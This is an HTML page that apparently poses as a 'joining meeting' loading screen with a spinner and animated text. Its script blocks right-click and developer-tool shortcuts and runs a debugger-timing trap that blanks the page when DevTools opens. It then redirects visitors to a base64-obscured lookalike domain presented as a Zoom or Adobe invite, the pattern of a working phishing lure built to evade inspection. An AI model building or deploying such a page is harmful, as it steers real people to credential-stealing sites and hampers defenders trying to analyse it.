<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Joining meeting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* completely black background */
        body {
            background-color: #000000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: system-ui, 'Segoe UI', -apple-system, 'Helvetica Neue', sans-serif;
            margin: 0;
            padding: 1rem;
        }

        /* vertical stack: spinner on top, text right under it */
        .join-layout {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 1.5rem;
            width: 100%;
            background: transparent;
        }

        /* SINGLE LAYER BLUE SPINNER - clean, one ring only */
        .spinner-blue {
            width: 48px;
            height: 48px;
            border: 3px solid rgba(30, 136, 229, 0.25);
            border-top: 3px solid #1e88e5;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            background: transparent;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        /* joining meeting text styling */
        .joining-label {
            font-size: 1.5rem;
            font-weight: 500;
            letter-spacing: -0.2px;
            color: #e8eef2;
            text-align: center;
            display: flex;
            align-items: center;
            gap: 2px;
            background: transparent;
        }

        /* animated ellipsis for live connecting feel */
        .live-dots {
            display: inline-flex;
            gap: 2px;
            margin-left: 2px;
        }

        .live-dots span {
            display: inline-block;
            font-weight: 600;
            animation: pulseDot 1.4s infinite;
            font-size: inherit;
        }

        .live-dots span:nth-child(1) { animation-delay: 0s; }
        .live-dots span:nth-child(2) { animation-delay: 0.2s; }
        .live-dots span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes pulseDot {
            0%, 20% {
                opacity: 0.2;
            }
            50% {
                opacity: 1;
            }
            100% {
                opacity: 0.2;
            }
        }

        /* responsive sizes */
        @media (max-width: 500px) {
            .spinner-blue {
                width: 42px;
                height: 42px;
                border-width: 3px;
            }
            .joining-label {
                font-size: 1.3rem;
            }
            .join-layout {
                gap: 1.2rem;
            }
        }

        @media (max-width: 380px) {
            .spinner-blue {
                width: 38px;
                height: 38px;
            }
            .joining-label {
                font-size: 1.2rem;
            }
        }

        /* subtle fade-in */
        .join-layout {
            animation: fadeSlide 0.3s ease-out;
        }

        @keyframes fadeSlide {
            from {
                opacity: 0;
                transform: translateY(6px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        html {
            background-color: #000000;
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0,0,0,0);
            border: 0;
        }
    </style>
</head>
<body>
    <div class="join-layout" aria-label="Joining meeting interface">
        <!-- SINGLE LAYER BLUE SPINNER -->
        <div class="spinner-blue" role="status" aria-label="Connecting to meeting"></div>
        
        <!-- joining meeting text right under spinner -->
        <div class="joining-label">
            joining meeting
            <span class="live-dots" aria-hidden="true">
                <span>.</span><span>.</span><span>.</span>
            </span>
        </div>
    </div>

    <!-- REDIRECTION SCRIPT with anti-debug, anti-right-click, and anti-dev-tools protection -->
    <script type="text/javascript">
        // Anti right-click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
        // Anti F12 and other dev tools shortcuts
        document.addEventListener('keydown', function(e) {
            // F12
            if (e.keyCode === 123) {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+I
            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+J
            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
                e.preventDefault();
                return false;
            }
            // Ctrl+U
            if (e.ctrlKey && e.keyCode === 85) {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+C
            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
                e.preventDefault();
                return false;
            }
        });
        
        // Anti-debug - detects if DevTools is open by measuring debugger performance
        setInterval(function() {
            const start = performance.now();
            debugger;
            const end = performance.now();
            if (end - start > 100) {
                window.location.href = 'about:blank';
            }
        }, 1000);
        
        // Redirect after 2 seconds to the meeting invite URL
        // Decoded: https://adobeinviteinc.co/invite-zoom
        setTimeout(function() {
            window.location.href = atob('aHR0cHM6Ly9hZG9iZWludml0ZWluYy5jby9pbnZpdGUtem9vbQ==');
        }, 6000);
    </script>
</body>
</html>
